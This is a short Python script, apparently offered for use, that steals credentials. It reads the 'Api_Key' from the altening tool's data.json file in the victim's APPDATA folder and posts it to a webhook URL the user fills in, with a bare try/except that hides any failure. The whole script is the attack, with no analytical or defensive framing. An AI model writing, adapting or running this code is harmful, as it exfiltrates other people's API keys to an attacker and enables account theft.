import os
import json
import requests

#enter you webhook url here
WEBHOOK_URL = ""

def main():

    path = os.getenv('APPDATA') + '\\altening\\data.json'
    if os.path.exists(path):
        with open(path) as path:
            api = json.load(path)
    key = api.get("Api_Key")

    try:
        requests.post(WEBHOOK_URL,json = {'content' : f'```{key}```'} )
    except:
        pass

if __name__ == '__main__':
    main()


